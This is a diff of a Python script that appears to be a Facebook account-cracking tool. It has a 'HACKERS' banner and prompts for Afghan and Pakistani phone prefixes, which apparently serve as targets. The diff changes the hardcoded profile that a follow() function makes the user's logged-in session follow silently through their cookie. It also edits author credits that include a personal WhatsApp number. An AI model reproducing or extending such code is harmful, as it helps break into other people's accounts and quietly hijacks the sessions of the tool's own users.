@@ -117,7 +117,7 @@ def cek_apk(session,coki):
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100028315179402', {
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -173,17 +173,16 @@ logo =                                          f"""{H}
       \033[1;39m .##...##.........##.##.....##
       \033[1;32m .##....##..##....##.##.....##
       \033[1;39m .##.....##..######..##.....##
-                                                   
                                                                                                                                      
 \033[1;37m WELL COME 
-\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32m    Raziqullah Saadat \033[1;31m
-\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Raziqullah Saadat\033[1;31m 
-\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m Arman\033[1;31m 
+\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32m     Raziqullah Saadat \033[1;31m
+\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32mRaziqullah Saadat\033[1;31m 
+\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32mARMAN\033[1;31m 
 \033[1;31m\033[1;32m\033[1;32mWHATSAPP \033[1;31m\033[1;32m +93702856593 \033[1;31m 
-\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 10.00\033[1;31m 
-\033[1;37mMESSENGER GROUP ASIAN HACKERS{ M }\033[1;37m 
+\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m10.00\033[1;31m 
+\033[1;37mWHTASAPP GROUP SAADAT HACKERS{ M }\033[1;37m 
 \033[1;92m==========================================================
-\033[33;44m NAME YAD SATYE Raziqullah Saadat \033[0;m
+\033[33;44m NAME YAD SATYE HAROON ARMAN \033[0;m
 \033[1;92m=========================================================="""      
 loop = 0
 oks = []
@@ -249,7 +248,7 @@ def i():
     jalan(logo)
     
     
-    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
+    jalan("\033[1;37m\t  USE ALL COUNTRY CODE  ")
     jalan('\033[1;36m     \t     AFG CODES\n     \033[1;33m9370, \033[1;33m9377 ,\033[1;33m9378 ,\033[1;33m9370  ...\033[0;97m')
     jalan('\033[1;32m============================================')
     jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
